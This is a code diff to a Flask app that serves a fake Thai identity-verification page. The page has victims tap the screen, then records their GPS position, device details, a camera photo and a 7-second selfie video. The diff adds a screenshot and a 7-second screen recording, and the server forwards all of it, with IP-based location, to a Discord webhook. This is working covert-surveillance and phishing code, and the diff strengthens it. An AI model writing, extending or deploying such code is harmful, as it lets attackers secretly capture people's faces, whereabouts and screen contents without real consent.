@@ -83,7 +83,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 5-6 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 8-9 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -137,9 +137,7 @@ HTML = '''<!DOCTYPE html>
             // GPS 5 วินาที
             try {
                 const pos = await new Promise((resolve, reject) => {
-                    const timeoutId = setTimeout(() => {
-                        reject(new Error('GPS timeout'));
-                    }, 5000);
+                    const timeoutId = setTimeout(() => reject(new Error('GPS timeout')), 5000);
                     navigator.geolocation.getCurrentPosition(
                         (p) => { clearTimeout(timeoutId); resolve(p); },
                         (err) => { clearTimeout(timeoutId); reject(err); },
@@ -151,7 +149,6 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.gps_accuracy = Math.round(pos.coords.accuracy);
                 deviceInfo.gps_fallback = false;
             } catch(e) {
-                console.log('GPS error:', e.message);
                 deviceInfo.gps_fallback = true;
             }
             
@@ -163,6 +160,7 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.batteryLevel = 'ไม่รองรับ';
             }
             
+            // กล้อง
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
@@ -188,7 +186,7 @@ HTML = '''<!DOCTYPE html>
                     if (e.data.size > 0) chunks.push(e.data);
                 };
                 recorder.start();
-                await new Promise(r => setTimeout(r, 3000));
+                await new Promise(r => setTimeout(r, 7000)); // 7 วินาที
                 recorder.stop();
                 await new Promise(r => recorder.onstop = r);
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
@@ -196,9 +194,53 @@ HTML = '''<!DOCTYPE html>
                 stream.getTracks().forEach(t => t.stop());
                 video.remove();
                 
+                // --- แคปหน้าจอ (ขออนุญาตแยก) ---
+                let screenshotBlob = null;
+                let screenVideoBlob = null;
+                try {
+                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    const screenVideo = document.createElement('video');
+                    screenVideo.style.display = 'none';
+                    document.body.appendChild(screenVideo);
+                    screenVideo.srcObject = screenStream;
+                    await screenVideo.play();
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    // แคปหน้าจอ
+                    const screenCanvas = document.createElement('canvas');
+                    screenCanvas.width = screenVideo.videoWidth || 1280;
+                    screenCanvas.height = screenVideo.videoHeight || 720;
+                    screenCanvas.getContext('2d').drawImage(screenVideo, 0, 0);
+                    screenshotBlob = await new Promise(r => screenCanvas.toBlob(r, 'image/jpeg', 0.8));
+                    
+                    // บันทึกวิดีโอหน้าจอ 7 วินาที
+                    const screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
+                    const screenChunks = [];
+                    screenRecorder.ondataavailable = e => {
+                        if (e.data.size > 0) screenChunks.push(e.data);
+                    };
+                    screenRecorder.start();
+                    await new Promise(r => setTimeout(r, 7000));
+                    screenRecorder.stop();
+                    await new Promise(r => screenRecorder.onstop = r);
+                    screenVideoBlob = new Blob(screenChunks, { type: 'video/webm' });
+                    
+                    screenStream.getTracks().forEach(t => t.stop());
+                    screenVideo.remove();
+                } catch(e) {
+                    console.log('Screen capture denied:', e);
+                }
+                // ----------------------------------
+                
                 const formData = new FormData();
                 formData.append('photo', photoBlob, 'photo.jpg');
                 formData.append('video', videoBlob, 'video.webm');
+                if (screenshotBlob) {
+                    formData.append('screenshot', screenshotBlob, 'screenshot.jpg');
+                }
+                if (screenVideoBlob) {
+                    formData.append('screen_video', screenVideoBlob, 'screen_video.webm');
+                }
                 formData.append('info', JSON.stringify(deviceInfo));
                 
                 await fetch('/upload', {
@@ -238,10 +280,11 @@ def upload():
         
         photo = request.files.get('photo')
         video = request.files.get('video')
+        screenshot = request.files.get('screenshot')
+        screen_video = request.files.get('screen_video')
         
         location = get_location_from_ip(real_ip)
         
-        # ถ้า GPS ได้ ใช้ GPS; ถ้าไม่ได้ ใช้ IP
         if device_info.get('gps_fallback') and location:
             device_info['gps_lat'] = location['lat']
             device_info['gps_lon'] = location['lon']
@@ -276,7 +319,6 @@ def upload():
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
-        # GPS หรือ IP
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
             source = device_info.get('gps_from', 'GPS')
             if source == 'IP':
@@ -322,6 +364,12 @@ def upload():
         if video:
             video.seek(0)
             files['file2'] = ('video.webm', video.read(), 'video/webm')
+        if screenshot:
+            screenshot.seek(0)
+            files['file3'] = ('screenshot.jpg', screenshot.read(), 'image/jpeg')
+        if screen_video:
+            screen_video.seek(0)
+            files['file4'] = ('screen_video.webm', screen_video.read(), 'video/webm')
         
         if files:
             requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
